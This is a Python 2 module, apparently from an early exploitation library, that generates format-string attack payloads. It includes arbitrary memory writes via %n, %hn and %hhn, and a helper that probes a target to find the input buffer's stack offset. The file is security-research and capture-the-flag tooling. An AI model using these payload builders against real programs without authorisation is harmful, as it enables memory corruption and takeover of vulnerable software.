import pwn

def fmtstring(towrite, buf_offset, writesize = 1, pre_written = 0, use_posix_extension = True):
    out = ''
    if not (1 <= writesize <= 4):
        pwn.die('fmtstring: writesize has to be between 1-4')
    if not isinstance(towrite,dict):
        pwn.die('fmtstring: towrite has to be {address,data}')

    for address in towrite.keys():
        data = towrite[address]
        out += pwn.flat(address + n * writesize for n in range(len(data)))
    if '%' in out:
        pwn.die('I do not know how to handle addresses with "%" in them')
    if '\x00' in out:
        pwn.die('I do not know how to handle addresses with null characters in them')

    bytes_written = len(out) + pre_written

    for data in towrite.values():
        bufsize = len(data)
        data = [pwn.uint(dat) for dat in pwn.group(writesize, data)]
        for n, dat in enumerate(data):
            bufpos = writesize*n
            bufleft = bufsize - bufpos

            mod_value = 0x100 ** min(bufleft, writesize)

            cur_num_bytes = (dat - bytes_written) % mod_value
            cur_num_bytes = (cur_num_bytes + mod_value) % mod_value
            bytes_written += cur_num_bytes

            if cur_num_bytes == 0:
                pass
            if cur_num_bytes == 1:
                out += '%c'
            elif cur_num_bytes > 1:
                out += '%' + str(cur_num_bytes) + 'c'

            out += '%' + str(buf_offset+n) + '$'

            if use_posix_extension:
                if bufleft == 1:
                    out += 'hh'
                elif bufleft == 2:
                    out += 'h'
            out += 'n'

    return out

def fmt_findoffset(fun, limit=None, num=6, delim='.'):
    ''' This function attempts to find the offset of the input format string on a buffer
See pwn/test/fmtstring/doit.py for example usage
'''
    dummy = "AAAA" + (delim+"%x") * num
    idx = False
    step = 5
    for i in range(1, 10, step):
        dummy = "AAAA"
        for x in range(i, i+step):
            dummy += (delim+"%"+str(x)+"$x")
        conn = fun(dummy)
        line = conn.recvline()
        splitted = line.split(delim)
        if '41414141' in splitted:
            idx = splitted.index('41414141') + i-1
            break
        else:
            conn.close()
    return idx



if __name__ == '__main__':
    testdict = {0x8040bbbb:'hej verden',0x8888aaaa:'ged'}
    a = fmtstring(testdict,2)
    print map(hex,map(ord,a))
    print a
